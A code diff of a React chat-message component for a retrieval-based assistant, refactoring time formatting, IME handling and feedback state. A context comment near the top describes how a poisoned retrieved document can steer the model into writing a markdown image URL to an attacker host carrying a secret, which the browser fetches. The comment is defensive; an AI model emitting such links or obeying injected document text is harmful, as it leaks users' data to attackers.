@@ -2,12 +2,13 @@ import { memo, useEffect, useMemo, useRef, useState } from 'react';
 import type { ReactNode } from 'react';
 import type { Components } from 'react-markdown';
 import type { CitationResponse, FeedbackRating, TimingsResponse } from '../api/types';
-import { withCitationFootnotes } from '../utils/exportChat';
+import { TIME_FORMATTER, withCitationFootnotes } from '../utils/exportChat';
 import { citationNumberFromHref, linkCitations } from '../utils/citations';
 import CitationCard from './CitationCard';
 import { useMarkdownRenderer } from './markdownLoader';
 import StreamingSkeleton from './StreamingSkeleton';
 import './ChatMessage.css';
+import { isImeComposing } from '../utils/keyboard';
 
 // Answers quote retrieved documents, and a poisoned document can steer the model into
 // writing `![](https://attacker/?q=<secret>)` — which the browser would fetch the moment
@@ -29,7 +30,6 @@ function ExternalLink({ href, children }: { href?: string; children?: ReactNode 
 // Error turns created before this page load are history, not news: announcing each one
 // as an alert on every conversation switch or reload read out stale failures.
 const SESSION_STARTED_AT = Date.now();
-const TIME_FORMAT = new Intl.DateTimeFormat(undefined, { hour: '2-digit', minute: '2-digit' });
 
 export interface FeedbackPayload {
   turnId: string;
@@ -119,6 +119,8 @@ function ChatMessage({
   // would just resubmit the same signal, so the buttons disable after the first pick.
   // Seeded from the turn so a remount (reload, conversation switch) can't re-enable them.
   const [feedbackGiven, setFeedbackGiven] = useState<FeedbackRating | null>(turn.feedback ?? null);
+  // Follows the turn when a rating that failed to send is taken back.
+  useEffect(() => setFeedbackGiven(turn.feedback ?? null), [turn.feedback]);
   const copyTimerRef = useRef<ReturnType<typeof setTimeout> | undefined>(undefined);
   useEffect(() => () => clearTimeout(copyTimerRef.current), []);
 
@@ -252,7 +254,7 @@ function ChatMessage({
                 value={draft}
                 onChange={(event) => setDraft(event.target.value)}
                 onKeyDown={(event) => {
-                  if (event.nativeEvent.isComposing || event.keyCode === 229) return;
+                  if (isImeComposing(event)) return;
                   if (event.key === 'Escape') {
                     event.stopPropagation();
                     setEditing(false);
@@ -351,7 +353,7 @@ function ChatMessage({
                 className="chat-message__timestamp mono"
                 dateTime={new Date(turn.timestamp).toISOString()}
               >
-                {TIME_FORMAT.format(turn.timestamp)}
+                {TIME_FORMATTER.format(turn.timestamp)}
               </time>
               {turn.content && (
                 <button
